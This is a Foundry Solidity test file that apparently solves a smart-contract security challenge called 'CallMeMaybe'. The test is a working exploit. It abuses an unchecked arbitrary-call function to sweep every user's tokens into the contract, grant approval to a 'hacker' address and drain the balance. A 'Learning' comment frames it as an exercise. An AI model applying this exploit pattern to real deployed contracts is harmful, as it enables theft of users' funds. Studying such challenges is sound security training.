// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import {Test, console, stdStorage, StdStorage} from "forge-std/Test.sol";
import {CallMeMaybe} from "../src/2_CallMeMaybe.sol";
import {CallMeMaybeHelper} from "../test_helper/2_CallMeMaybeSetup.sol";
import "../mocks/marqToken.sol";

contract CallMeMaybeTest is Test {
    using stdStorage for StdStorage;
    CallMeMaybe public target;
    MarqToken public token;
    address[] public users = [address(0x01), address(0x02), address(0x03)];

    function setUp() public {
        CallMeMaybeHelper dontpeak = new CallMeMaybeHelper();
        target = dontpeak.deployed();
        token = dontpeak.token();
    }

    /**
    Learning:
    .call() use with caution, consider the checks-effects-interaction pattern
    vm.startPrank(); // to mimic msg.sender in subsequent tx invocations
    vm.stopPrank(); // removes the msg.sender set by startPrank()
    abi.encodeCall(functionSignature, tuple) // to abi encode the function call for contracts
    */
    function test_GetThisPassing_2() public {
        address hacker = address(0xBAD);

        uint256 startBalance = token.balanceOf(hacker);
        console.log("Staring balance", startBalance);
        vm.startPrank(hacker);
        // Join Group
        token.approve(address(target), type(uint256).max);
        target.joinGroup(1 ether);

        // The catch lies in the code at line no: 36 `_target.call(_calldata)`
        // Transfer all users token to the contract
        for (uint256 i = 0; i < 3; i++) {
            bytes memory transferCallData = abi.encodeCall(
                token.transferFrom,
                (users[i], address(target), token.balanceOf(users[i]))
            );
            target.usePooledWealth(transferCallData, address(token));
        }

        // Give an approval to hacker address & then transfer all the tokens from the contract to the hacker address
        bytes memory approveCalldata = abi.encodeCall(
            token.approve,
            (hacker, type(uint256).max)
        );
        target.usePooledWealth(approveCalldata, address(token));

        // Transfer all tokens from the contract to the hacker account
        token.transferFrom(
            address(target),
            hacker,
            token.balanceOf(address(target))
        );
        vm.stopPrank();

        assertGt(token.balanceOf(hacker), 301 ether);
    }
}
